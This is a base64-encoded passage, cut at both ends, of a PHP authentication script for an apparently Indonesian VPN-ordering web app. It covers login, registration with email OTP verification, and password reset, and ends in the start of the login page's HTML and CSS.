VTU0lPTlsncm9sZSddPSR1c2VyWydyb2xlJ107CiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWydzYWxkbyddPSR1c2VyWydzYWxkbyddOwogICAgICAgICAgICAgICAgICAgICRpcD0kX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXT8/JF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CiAgICAgICAgICAgICAgICAgICAgJGRiLT5wcmVwYXJlKCJVUERBVEUgdXNlcnMgU0VUIGlwX2FkZHJlc3M9PyBXSEVSRSBpZD0/IiktPmV4ZWN1dGUoWyRpcCwkdXNlclsnaWQnXV0pOwogICAgICAgICAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IC9vcmRlcnZwbi9kYXNoYm9hcmQucGhwJyk7IGV4aXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7ICRlcnJvcj0nVXNlcm5hbWUgYXRhdSBwYXNzd29yZCBzYWxhaCEnOyB9CiAgICAgICAgfQogICAgfQoKICAgIGlmICgkYWN0aW9uPT09J3JlZ2lzdGVyJykgewogICAgICAgICR1PXNhbml0aXplKCRfUE9TVFsncmVnX3VzZXJuYW1lJ10/PycnKTsKICAgICAgICAkZT1zYW5pdGl6ZSgkX1BPU1RbJ3JlZ19lbWFpbCddPz8nJyk7CiAgICAgICAgJHA9JF9QT1NUWydyZWdfcGFzc3dvcmQnXT8/Jyc7CiAgICAgICAgJGM9JF9QT1NUWydyZWdfY29uZmlybSddPz8nJzsKICAgICAgICBpZiAoZW1wdHkoJHUpfHxlbXB0eSgkZSl8fGVtcHR5KCRwKSkgeyAkZXJyb3I9J1NlbXVhIGZpZWxkIHdhamliIGRpaXNpISc7IH0KICAgICAgICBlbHNlaWYgKCRwIT09JGMpIHsgJGVycm9yPSdQYXNzd29yZCB0aWRhayBjb2NvayEnOyB9CiAgICAgICAgZWxzZWlmIChzdHJsZW4oJHApPDYpIHsgJGVycm9yPSdQYXNzd29yZCBtaW5pbWFsIDYga2FyYWt0ZXIhJzsgfQogICAgICAgIGVsc2VpZiAoIWZpbHRlcl92YXIoJGUsRklMVEVSX1ZBTElEQVRFX0VNQUlMKSkgeyAkZXJyb3I9J0Zvcm1hdCBlbWFpbCB0aWRhayB2YWxpZCEnOyB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRkYj1nZXREQigpOwogICAgICAgICAgICAkY2hrPSRkYi0+cHJlcGFyZSgiU0VMRUNUIGlkIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWU9PyBPUiBlbWFpbD0/Iik7CiAgICAgICAgICAgICRjaGstPmV4ZWN1dGUoWyR1LCRlXSk7CiAgICAgICAgICAgIGlmICgkY2hrLT5mZXRjaCgpKSB7ICRlcnJvcj0nVXNlcm5hbWUgYXRhdSBlbWFpbCBzdWRhaCBkaWd1bmFrYW4hJzsgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRvdHAgPSBzdHJfcGFkKHJhbmQoMCw5OTk5OTkpLDYsJzAnLFNUUl9QQURfTEVGVCk7CiAgICAgICAgICAgICAgICAkb3RwRXhwID0gZGF0ZSgnWS1tLWQgSDppOnMnLCBzdHJ0b3RpbWUoJysxNSBtaW51dGVzJykpOwogICAgICAgICAgICAgICAgJGhhc2ggPSBwYXNzd29yZF9oYXNoKCRwLCBQQVNTV09SRF9CQ1JZUFQpOwogICAgdHJ5IHsKICAgICAgICAkZGItPnByZXBhcmUoIklOU0VSVCBJTlRPIHVzZXJzICh1c2VybmFtZSxlbWFpbCxwYXNzd29yZCxvdHBfY29kZSxvdHBfZXhwaXJlcyxpc192ZXJpZmllZCkgVkFMVUVTICg/LD8sPyw/LD8sMCkiKQogICAgICAgICAgIC0+ZXhlY3V0ZShbJHUsJGUsJGhhc2gsJG90cCwkb3RwRXhwXSk7CiAgICB9IGNhdGNoIChQRE9FeGNlcHRpb24gJGUpIHsKICAgICAgICBpZiAoJGUtPmdldENvZGUoKSA9PSAyMzAwMCkgewogICAgICAgICAgICAkZXJyb3IgPSAiVXNlcm5hbWUgYXRhdSBlbWFpbCBzdWRhaCB0ZXJkYWZ0YXIhIEd1bmFrYW4geWFuZyBsYWluLiI7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgdGhyb3cgJGU7CiAgICAgICAgfQogICAgfQoKICAgICAgICAgICAgICAgICRlbWFpbEJvZHkgPSAiCiAgICAgICAgICAgICAgICA8ZGl2IHN0eWxlPSdmb250LWZhbWlseTpzYW5zLXNlcmlmO21heC13aWR0aDo0ODBweDttYXJnaW46MCBhdXRvO2JhY2tncm91bmQ6IzBmMTcyYTtjb2xvcjojZjFmNWY5O3BhZGRpbmc6MzJweDtib3JkZXItcmFkaXVzOjE2cHg7Jz4KICAgICAgICAgICAgICAgICAgPGgyIHN0eWxlPSdjb2xvcjojNjBhNWZhO21hcmdpbi1ib3R0b206OHB4Oyc+4pqhIHskYXBwTmFtZX08L2gyPgogICAgICAgICAgICAgICAgICA8cCBzdHlsZT0nY29sb3I6Izk0YTNiODsnPlZlcmlmaWthc2kgYWt1biBrYW11PC9wPgogICAgICAgICAgICAgICAgICA8ZGl2IHN0eWxlPSdiYWNrZ3JvdW5kOiMxZTI5M2I7Ym9yZGVyLXJhZGl1czoxMnB4O3BhZGRpbmc6MjRweDttYXJnaW46MjRweCAwO3RleHQtYWxpZ246Y2VudGVyOyc+CiAgICAgICAgICAgICAgICAgICAgPHAgc3R5bGU9J2NvbG9yOiM5NGEzYjg7Zm9udC1zaXplOjE0cHg7bWFyZ2luLWJvdHRvbTo4cHg7Jz5Lb2RlIE9UUCBrYW11OjwvcD4KICAgICAgICAgICAgICAgICAgICA8ZGl2IHN0eWxlPSdmb250LXNpemU6NDBweDtmb250LXdlaWdodDo4MDA7bGV0dGVyLXNwYWNpbmc6MTJweDtjb2xvcjojNjBhNWZhOyc+eyRvdHB9PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPHAgc3R5bGU9J2NvbG9yOiM0NzU1Njk7Zm9udC1zaXplOjEycHg7bWFyZ2luLXRvcDoxMnB4Oyc+QmVybGFrdSAxNSBtZW5pdDwvcD4KICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgIDxwIHN0eWxlPSdjb2xvcjojNjQ3NDhiO2ZvbnQtc2l6ZToxMnB4Oyc+SmlrYSBrYW11IHRpZGFrIG1lbmRhZnRhciwgYWJhaWthbiBlbWFpbCBpbmkuPC9wPgogICAgICAgICAgICAgICAgPC9kaXY+IjsKICAgICAgICAgICAgICAgIHNlbmRFbWFpbCgkZSwgIktvZGUgT1RQIFZlcmlmaWthc2kgLSB7JGFwcE5hbWV9IiwgJGVtYWlsQm9keSk7CiAgICAgICAgICAgICAgICAkc3VjY2Vzcz0nQWt1biBiZXJoYXNpbCBkaWJ1YXQhIENlayBlbWFpbCB1bnR1ayBrb2RlIE9UUCB2ZXJpZmlrYXNpLic7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgaWYgKCRhY3Rpb249PT0ndmVyaWZ5X290cCcpIHsKICAgICAgICAkZT1zYW5pdGl6ZSgkX1BPU1RbJ290cF9lbWFpbCddPz8nJyk7CiAgICAgICAgJG90cD1zYW5pdGl6ZSgkX1BPU1RbJ290cF9jb2RlJ10/PycnKTsKICAgICAgICAkZGI9Z2V0REIoKTsKICAgICAgICAkc3Q9JGRiLT5wcmVwYXJlKCJTRUxFQ1QgKiBGUk9NIHVzZXJzIFdIRVJFIGVtYWlsPT8gQU5EIG90cF9jb2RlPT8gQU5EIG90cF9leHBpcmVzID4gTk9XKCkiKTsKICAgICAgICAkc3QtPmV4ZWN1dGUoWyRlLCRvdHBdKTsgJHVzZXI9JHN0LT5mZXRjaCgpOwogICAgICAgIGlmICgkdXNlcikgewogICAgICAgICAgICAkZGItPnByZXBhcmUoIlVQREFURSB1c2VycyBTRVQgaXNfdmVyaWZpZWQ9MSwgb3RwX2NvZGU9TlVMTCwgb3RwX2V4cGlyZXM9TlVMTCBXSEVSRSBpZD0/IiktPmV4ZWN1dGUoWyR1c2VyWydpZCddXSk7CiAgICAgICAgICAgICRzdWNjZXNzPSdFbWFpbCBiZXJoYXNpbCBkaXZlcmlmaWthc2khIFNpbGFrYW4gbG9naW4uJzsKICAgICAgICB9IGVsc2UgeyAkZXJyb3I9J0tvZGUgT1RQIHNhbGFoIGF0YXUgc3VkYWggZXhwaXJlZCEnOyB9CiAgICB9CgogICAgaWYgKCRhY3Rpb249PT0ncmVzZW5kX290cCcpIHsKICAgICAgICAkZT1zYW5pdGl6ZSgkX1BPU1RbJ3Jlc2VuZF9lbWFpbCddPz8nJyk7CiAgICAgICAgJGRiPWdldERCKCk7CiAgICAgICAgJHN0PSRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSBlbWFpbD0/IEFORCBpc192ZXJpZmllZD0wIik7CiAgICAgICAgJHN0LT5leGVjdXRlKFskZV0pOyAkdXNlcj0kc3QtPmZldGNoKCk7CiAgICAgICAgaWYgKCR1c2VyKSB7CiAgICAgICAgICAgICRvdHA9c3RyX3BhZChyYW5kKDAsOTk5OTk5KSw2LCcwJyxTVFJfUEFEX0xFRlQpOwogICAgICAgICAgICAkb3RwRXhwPWRhdGUoJ1ktbS1kIEg6aTpzJyxzdHJ0b3RpbWUoJysxNSBtaW51dGVzJykpOwogICAgICAgICAgICAkZGItPnByZXBhcmUoIlVQREFURSB1c2VycyBTRVQgb3RwX2NvZGU9PyxvdHBfZXhwaXJlcz0/IFdIRVJFIGlkPT8iKS0+ZXhlY3V0ZShbJG90cCwkb3RwRXhwLCR1c2VyWydpZCddXSk7CiAgICAgICAgICAgICRlbWFpbEJvZHk9IjxkaXYgc3R5bGU9J2ZvbnQtZmFtaWx5OnNhbnMtc2VyaWY7cGFkZGluZzozMnB4O2JhY2tncm91bmQ6IzBmMTcyYTtjb2xvcjojZjFmNWY5O2JvcmRlci1yYWRpdXM6MTZweDsnPjxoMiBzdHlsZT0nY29sb3I6IzYwYTVmYTsnPktvZGUgT1RQIEJhcnU8L2gyPjxkaXYgc3R5bGU9J2ZvbnQtc2l6ZTo0MHB4O2ZvbnQtd2VpZ2h0OjgwMDtsZXR0ZXItc3BhY2luZzoxMnB4O2NvbG9yOiM2MGE1ZmE7dGV4dC1hbGlnbjpjZW50ZXI7bWFyZ2luOjI0cHggMDsnPnskb3RwfTwvZGl2PjxwIHN0eWxlPSdjb2xvcjojNjQ3NDhiO2ZvbnQtc2l6ZToxMnB4Oyc+QmVybGFrdSAxNSBtZW5pdC48L3A+PC9kaXY+IjsKICAgICAgICAgICAgc2VuZEVtYWlsKCRlLCJLb2RlIE9UUCBCYXJ1IC0geyRhcHBOYW1lfSIsJGVtYWlsQm9keSk7CiAgICAgICAgICAgICRzdWNjZXNzPSdPVFAgYmFydSBzdWRhaCBkaWtpcmltIGtlIGVtYWlsIGthbXUuJzsKICAgICAgICB9IGVsc2UgeyAkZXJyb3I9J0VtYWlsIHRpZGFrIGRpdGVtdWthbiBhdGF1IHN1ZGFoIHRlcnZlcmlmaWthc2kuJzsgfQogICAgfQp9CgogICAgLy8gPT09IEZPUkdPVCBQQVNTV09SRCA9PT0KICAgIGlmICgkYWN0aW9uPT09J2ZvcmdvdF9wYXNzd29yZCcpIHsKICAgICAgICAkZSA9IHNhbml0aXplKCRfUE9TVFsnZm9yZ290X2VtYWlsJ10/PycnKTsKICAgICAgICBpZiAoZW1wdHkoJGUpIHx8ICFmaWx0ZXJfdmFyKCRlLCBGSUxURVJfVkFMSURBVEVfRU1BSUwpKSB7CiAgICAgICAgICAgICRlcnJvciA9ICdNYXN1a2thbiBlbWFpbCB5YW5nIHZhbGlkISc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGRiID0gZ2V0REIoKTsKICAgICAgICAgICAgJHN0ID0gJGRiLT5wcmVwYXJlKCJTRUxFQ1QgKiBGUk9NIHVzZXJzIFdIRVJFIGVtYWlsPT8iKTsKICAgICAgICAgICAgJHN0LT5leGVjdXRlKFskZV0pOyAkdXNlciA9ICRzdC0+ZmV0Y2goKTsKICAgICAgICAgICAgaWYgKCR1c2VyKSB7CiAgICAgICAgICAgICAgICAkb3RwID0gc3RyX3BhZChyYW5kKDAsOTk5OTk5KSwgNiwgJzAnLCBTVFJfUEFEX0xFRlQpOwogICAgICAgICAgICAgICAgJG90cEV4cCA9IGRhdGUoJ1ktbS1kIEg6aTpzJywgc3RydG90aW1lKCcrMTUgbWludXRlcycpKTsKICAgICAgICAgICAgICAgICRkYi0+cHJlcGFyZSgiVVBEQVRFIHVzZXJzIFNFVCBvdHBfY29kZT0/LCBvdHBfZXhwaXJlcz0/IFdIRVJFIGlkPT8iKQogICAgICAgICAgICAgICAgICAgLT5leGVjdXRlKFskb3RwLCAkb3RwRXhwLCAkdXNlclsnaWQnXV0pOwogICAgICAgICAgICAgICAgJGVtYWlsQm9keSA9ICI8ZGl2IHN0eWxlPSdmb250LWZhbWlseTpzYW5zLXNlcmlmO21heC13aWR0aDo0ODBweDttYXJnaW46MCBhdXRvO2JhY2tncm91bmQ6IzBmMTcyYTtjb2xvcjojZjFmNWY5O3BhZGRpbmc6MzJweDtib3JkZXItcmFkaXVzOjE2cHg7Jz4KICAgICAgICAgICAgICAgICAgPGgyIHN0eWxlPSdjb2xvcjojNjBhNWZhO21hcmdpbi1ib3R0b206OHB4Oyc+UmVzZXQgUGFzc3dvcmQgLSB7JGFwcE5hbWV9PC9oMj4KICAgICAgICAgICAgICAgICAgPHAgc3R5bGU9J2NvbG9yOiM5NGEzYjg7Jz5BbmRhIG1lbWludGEgcmVzZXQgcGFzc3dvcmQgdW50dWsgYWt1biA8Yj57JHVzZXJbJ3VzZXJuYW1lJ119PC9iPi48L3A+CiAgICAgICAgICAgICAgICAgIDxkaXYgc3R5bGU9J2JhY2tncm91bmQ6IzFlMjkzYjtib3JkZXItcmFkaXVzOjEycHg7cGFkZGluZzoyNHB4O21hcmdpbjoyNHB4IDA7dGV4dC1hbGlnbjpjZW50ZXI7Jz4KICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0nY29sb3I6Izk0YTNiODtmb250LXNpemU6MTRweDttYXJnaW4tYm90dG9tOjhweDsnPktvZGUgcmVzZXQgcGFzc3dvcmQ6PC9wPgogICAgICAgICAgICAgICAgICAgIDxkaXYgc3R5bGU9J2ZvbnQtc2l6ZTo0MHB4O2ZvbnQtd2VpZ2h0OjgwMDtsZXR0ZXItc3BhY2luZzoxMnB4O2NvbG9yOiM2MGE1ZmE7Jz57JG90cH08L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0nY29sb3I6IzQ3NTU2OTtmb250LXNpemU6MTJweDttYXJnaW4tdG9wOjEycHg7Jz5CZXJsYWt1IDE1IG1lbml0PC9wPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgPHAgc3R5bGU9J2NvbG9yOiM2NDc0OGI7Zm9udC1zaXplOjEycHg7Jz5KaWthIEFuZGEgdGlkYWsgbWVtaW50YSByZXNldCBwYXNzd29yZCwgYWJhaWthbiBlbWFpbCBpbmkuPC9wPgogICAgICAgICAgICAgICAgPC9kaXY+IjsKICAgICAgICAgICAgICAgIHNlbmRFbWFpbCgkZSwgIlJlc2V0IFBhc3N3b3JkIC0geyRhcHBOYW1lfSIsICRlbWFpbEJvZHkpOwogICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAnSmlrYSBlbWFpbCB0ZXJkYWZ0YXIgZGkgc2lzdGVtIGthbWksIGtvZGUgcmVzZXQgcGFzc3dvcmQgdGVsYWggZGlraXJpbS4gQ2VrIGluYm94ICh0ZXJtYXN1ayBmb2xkZXIgc3BhbSkuJzsKICAgICAgICAgICAgICAgICRyZXNldF9lbWFpbCA9ICRlOyAvLyBGb3IgYXV0by1maWxsaW5nIGhpZGRlbiBmaWVsZAogICAgICAgICAgICB9IAogICAgICAgICAgICAvLyBEb24ndCByZXZlYWwgd2hldGhlciBlbWFpbCBleGlzdHMgb3Igbm90CiAgICAgICAgICAgICRzdWNjZXNzID0gJ0ppa2EgZW1haWwgdGVyZGFmdGFyLCBrb2RlIHJlc2V0IHBhc3N3b3JkIHRlbGFoIGRpa2lyaW0ga2UgaW5ib3ggQW5kYS4gQ2VrIGp1Z2EgZm9sZGVyIHNwYW0uJzsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBpZiAoJGFjdGlvbj09PSdyZXNldF9wYXNzd29yZCcpIHsKICAgICAgICAkZSA9IHNhbml0aXplKCRfUE9TVFsncmVzZXRfZW1haWwnXT8/JycpOwogICAgICAgICRvdHAgPSBzYW5pdGl6ZSgkX1BPU1RbJ3Jlc2V0X290cCddPz8nJyk7CiAgICAgICAgJG5wID0gJF9QT1NUWyduZXdfcGFzc3dvcmQnXT8/Jyc7CiAgICAgICAgJGNwID0gJF9QT1NUWydjb25maXJtX3Bhc3N3b3JkJ10/PycnOwogICAgICAgIGlmIChlbXB0eSgkZSkgfHwgZW1wdHkoJG90cCkgfHwgZW1wdHkoJG5wKSkgewogICAgICAgICAgICAkZXJyb3IgPSAnU2VtdWEgZmllbGQgd2FqaWIgZGlpc2khJzsKICAgICAgICB9IGVsc2VpZiAoc3RybGVuKCRucCkgPCA2KSB7CiAgICAgICAgICAgICRlcnJvciA9ICdQYXNzd29yZCBiYXJ1IG1pbmltYWwgNiBrYXJha3RlciEnOwogICAgICAgIH0gZWxzZWlmICgkbnAgIT09ICRjcCkgewogICAgICAgICAgICAkZXJyb3IgPSAnUGFzc3dvcmQgdGlkYWsgY29jb2shJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkZGIgPSBnZXREQigpOwogICAgICAgICAgICAkc3QgPSAkZGItPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgZW1haWw9PyBBTkQgb3RwX2NvZGU9PyBBTkQgb3RwX2V4cGlyZXMgPiBOT1coKSIpOwogICAgICAgICAgICAkc3QtPmV4ZWN1dGUoWyRlLCAkb3RwXSk7ICR1c2VyID0gJHN0LT5mZXRjaCgpOwogICAgICAgICAgICBpZiAoJHVzZXIpIHsKICAgICAgICAgICAgICAgICRoYXNoID0gcGFzc3dvcmRfaGFzaCgkbnAsIFBBU1NXT1JEX0JDUllQVCk7CiAgICAgICAgICAgICAgICAkZGItPnByZXBhcmUoIlVQREFURSB1c2VycyBTRVQgcGFzc3dvcmQ9Pywgb3RwX2NvZGU9TlVMTCwgb3RwX2V4cGlyZXM9TlVMTCBXSEVSRSBpZD0/IikKICAgICAgICAgICAgICAgICAgIC0+ZXhlY3V0ZShbJGhhc2gsICR1c2VyWydpZCddXSk7CiAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICdQYXNzd29yZCBiZXJoYXNpbCBkaXJlc2V0ISBTaWxha2FuIGxvZ2luIGRlbmdhbiBwYXNzd29yZCBiYXJ1IEFuZGEuJzsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRlcnJvciA9ICdLb2RlIE9UUCBzYWxhaCBhdGF1IHN1ZGFoIGV4cGlyZWQhJzsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImlkIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgo8dGl0bGU+PD89JGFwcE5hbWU/PiDigJQgTG9naW48L3RpdGxlPgo8c3R5bGU+Cjpyb290IHsKICAtLWJnLWRlZXA6ICMwMjA2MTc7CiAgLS1iZy1jYXJkOiByZ2JhKDE1LCAyMywgNDIsIDAuNyk7CiAgLS1ib3JkZXI6IHJnYmEoMzAsIDU4LCA5NSwgMC41KTsKICAtLWJvcmRlci1hY2NlbnQ6IHJnYmEoNTksIDEzMCwgMjQ2LCAwLjQpOwogIC0tdGV4dC1wcmltYXJ5OiAjZjFmNWY5OwogIC0tdGV4dC1zZWNvbmRhcnk6ICM5NGEzYjg7CiAgLS10ZXh0LW11dGVkOiAjNDc1NTY5OwogIC0tYWNjZW50OiAjM2I4MmY2OwogIC0tYWNjZW50MjogIzBlYTVlOTsKICAtLWRhbmdlcjogI2VmNDQ0NDsKICAtLXN1Y2Nlc3M6ICMxMGI5ODE7CiAgLS1yYWRpdXM6IDE2cHg7CiAgLS1yYWRpdXMtc206IDEwcHg7CiAgLS10cmFuc2l0aW9uOiAwLjI1cyBjdWJpYy1iZXppZXIoMC40LCAwLCAwLjIsIDEpOwp9Cgoqe2JveC1zaXppbmc6Ym9yZGVyLWJveDttYXJnaW46MDtwYWRkaW5nOjB9Cgpib2R5IHsKICBmb250LWZhbWlseTogJ0ludGVyJywgJ1NlZ29lIFVJJywgc3lzdGVtLXVpLCAtYXBwbGUtc3lzdGVtLCBzYW5zLXNlcmlmOwogIGJhY2tncm91bmQ6IHZhcigtLWJnLWRlZXApOwogIG1pbi1oZWlnaHQ6IDEwMHZoOwogIG92ZXJmbG93LXg6IGhpZGRlbjsKICBjb2xvcjogdmFyKC0tdGV4dC1wcmltYXJ5KTsKfQoKLyogPT09IEFOSU1BVEVEIEJBQ0tHUk9VTkQgPT09ICovCi5iZy1sYXllciB7CiAgcG9zaXRpb246IGZpeGVkOyBpbnNldDogMDsgcG9pbnRlci1ldmVudHM6IG5vbmU7IHotaW5kZXg6IDA7Cn0KLmJnLWdyaWQgewogIHBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDA7CiAgYmFja2dyb3VuZC1pbWFnZToKICAgIGxpbmVhci1ncmFkaWVudChyZ2JhKDMwLCA1OCwgOTUsIDAuMTUpIDFweCwgdHJhbnNwYXJlbnQgMXB4KSwKICAgIGxpbmVhci1ncmFkaWVudCg5MGRlZywgcmdiYSgzMCwgNTgsIDk1LCAwLjE1KSAxcHgsIHRyYW5zcGFyZW50IDFweCk7CiAgYmFja2dyb3VuZC1zaXplOiA2MHB4IDYwcHg7CiAgbWFzay1pbWFnZTogcmFkaWFsLWdyYWRpZW50KGVsbGlwc2UgNzAlIDcwJSBhdCAzMCUgNTAlLCBibGFjayAzMCUsIHRyYW5zcGFyZW50IDcwJSk7Cn0KLyogPT09IE1BSU4gTEFZT1VUID09PSAqLwoubWFpbi1sYXlvdXQgewogIHBvc2l0aW9uOiByZWxhdGl2ZTsgei1pbmRleDogMTsKICBkaXNwbGF5OiBmbGV4OyBtaW4taGVpZ2h0OiAxMDB2aDsKICBhbGlnbi1pdGVtczogc3RyZXRjaDsKfQoKLyogPT09IExFRlQgUEFORUwgLSBCUkFORElORyA9PT0gKi8KLmxlZnQtcGFuZWwgewogIGZsZXg6IDE7IGRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IGp1c3RpZnktY29udGVudDogY2VudGVyOwogIHBhZGRpbmc6IDNyZW07IHBvc2l0aW9uOiByZWxhdGl2ZTsgb3ZlcmZsb3c6IGhpZGRlbjsKfQoubGVmdC1jb250ZW50IHsKICBtYXgtd2lkdGg6IDQ4MHB4OyB3aWR0aDogMTAwJTsKfQoubG9nby1zZWN0aW9uIHsKICBtYXJnaW4tYm90dG9tOiAyLjVyZW07Cn0KLmxvZ28taWNvbi13cmFwIHsKICB3aWR0aDogNjRweDsgaGVpZ2h0OiA2NHB4OwogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsIHZhcigtLWFjY2VudCksIHZhcigtLWFjY2VudDIpKTsKICBib3JkZXItcmFkaXVzOiAxOHB4OyBkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogY2VudGVyOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICBmb250LXNpemU6IDJyZW07IG1hcmdpbi1ib3R0b206IDEuMjVyZW07CiAgYm94LXNoYWRvdzogMCA4cHggMzJweCByZ2JhKDM3LCA5OSwgMjM1LCAwLjM1KTsKICBhbmltYXRpb246IGxvZ29QdWxzZSAzcyBlYXNlLWluLW91dCBpbmZpbml0ZTsKfQpAa2V5ZnJhbWVzIGxvZ29QdWxzZSB7CiAgMCUsMTAwJXtib3gtc2hhZG93OjAgOHB4IDMycHggcmdiYSgzNyw5OSwyMzUsMC4zNSl9CiAgNTAle2JveC1zaGFkb3c6MCAxMnB4IDQwcHggcmdiYSgzNyw5OSwyMzUsMC41NSl9Cn0KLyogPT09IFJJR0hUIFBBTkVMIC0gQVVUSCBDQVJEID09PSAqLwoucmlnaHQtcGFuZWwgewogIGZsZXg6IDAuOTsgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgcGFkZGluZzogMnJlbTsgcG9zaXRpb246IHJlbGF0aXZlOwp9Ci5hdXRoLXdyYXAgewogIHdpZHRoOiAxMDAlOyBtYXgtd2lkdGg6IDQ0MHB4Owp9Ci5hdXRoLWNhcmQgewogIGJhY2tncm91bmQ6IHZhcigtLWJnLWNhcmQpOwogIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWJvcmRlcik7CiAgYm9yZGVyLXJhZGl1czogMjBweDsgcGFkZGluZzogMi4yNXJlbTsKICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoMjRweCk7CiAgLXdlYmtpdC1iYWNrZHJvcC1maWx0ZXI6IGJsdXIoMjRweCk7CiAgYm94LXNoYWRvdzogMCAyNHB4IDgwcHggcmdiYSgwLCAwLCAwLCAwLjUpLAogICAgICAgICAgICAgIDAgMCAwIDFweCByZ2JhKDU5LCAxMzAsIDI0NiwgMC4wNSkgaW5zZXQ7CiAgdHJhbnNpdGlvbjogdmFyKC0tdHJhbnNpdGlvbik7Cn0KLmF1dGgtaGVhZGVyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7IG1hcmdpbi1ib3R0b206IDEuNzVyZW07Cn0KLmF1dGgtaGVhZGVyIGgyIHsKICBmb250LXNpemU6IDEuMzVyZW07IGZvbnQtd2VpZ2h0OiA3MDA7IGNvbG9yOiB2YXIoLS10ZXh0LXByaW1hcnkpOwogIG1hcmdpbi1ib3R0b206IDAuM3JlbTsKfQouYXV0aC1oZWFkZXIgcCB7CiAgZm9udC1zaXplOiAwLjg1cmVtOyBjb2xvcjogdmFyKC0tdGV4dC1tdXRlZCk7Cn0KCi8qIFRhYnMgKi8KLnRhYnMgewogIGRpc3BsYXk6IGZsZXg7IGJhY2tncm91bmQ6IHJnYmEoMTAsIDIyLCA0MCwgMC42KTsKICBib3JkZXItcmFkaXVzOiB2YXIoLS1yYWRpdXMtc20pOyBwYWRkaW5nOiA0cHg7IG1hcmdpbi1ib3R0b206IDEuNXJlbTsKICBnYXA6IDJweDsKfQoudGFiLWJ0biB7CiAgZmxleDogMTsgcGFkZGluZzogMC42cmVtIDAuNXJlbTsgYm9yZGVyOiBub25lOyBib3JkZXItcmFkaXVzOiA3cHg7CiAgY3Vyc29yOiBwb2ludGVyOyBmb250LXNpemU6IDAuODVyZW07IGZvbnQtd2VpZ2h0OiA2MDA7CiAgZm9udC1mYW1pbHk6IGluaGVyaXQ7IHRyYW5zaXRpb246IHZhcigtLXRyYW5zaXRpb24pOwogIHBvc2l0aW9uOiByZWxhdGl2ZTsgb3ZlcmZsb3c6IGhpZGRlbjsKfQoudGFiLWJ0bi5hY3RpdmUgewogIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsIHZhcigtLWFjY2VudCksIHZhcigtLWFjY2VudDIpKTsKICBjb2xvcjogI2ZmZjsgYm94LXNoYWRvdzogMCA0cHggMTVweCByZ2JhKDM3LCA5OSwgMjM1LCAwLjMpOwp9Ci50YWItYnRuOm5vdCguYWN0aXZlKSB7CiAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGNvbG9yOiB2YXIoLS10ZXh0LW11dGVkKTsKfQoudGFiLWJ0bjpub3QoLmFjdGl2ZSk6aG92ZXIgewogIGNvbG9yOiB2YXIoLS10ZXh0LXNlY29uZGFyeSk7IGJhY2tncm91bmQ6IHJnYmEoMzAsIDU4LCA5NSwgMC4zKTsKfQoudGFiLWNvbnRlbnQgewogIGRpc3BsYXk6IG5vbmU7CiAgYW5pbWF0aW9uOiBmYWRlU2xpZGVJbiAwLjM1cyBlYXNlOwp9Ci50YWItY29udGVudC5hY3RpdmUgeyBkaXNwbGF5OiBibG9jazsgfQpAa2V5ZnJhbWVzIGZhZGVTbGlkZUluIHsKICBmcm9tIHsgb3BhY2l0eTogMDsgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDhweCk7IH0KICB0byB7IG9wYWNpdHk6IDE7IHRyYW5zZm9ybTogdHJhbnNsYXRlWSgwKTsgfQp9CgovKiBGb3JtIGVsZW1lbnRzICovCi5mb3JtLWdyb3VwIHsgbWFyZ2luLWJvdHRvbTogMS4xcmVtOyB9Ci5mb3JtLWdyb3VwIGxhYmVsIHsKICBkaXNwbGF5OiBibG9jazsgZm9udC1zaXplOiAwLjc4cmVtOyBmb250LXdlaWdodDogNjAwOwogIGNvbG9yOiB2YXIoLS10ZXh0LXNlY29uZGFyeSk7IG1hcmdpbi1ib3R0b206IDAuNDVyZW07CiAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsgbGV0dGVyLXNwYWNpbmc6IDAuMDVlbTsKICB0cmFuc2l0aW9uOiB2YXIoL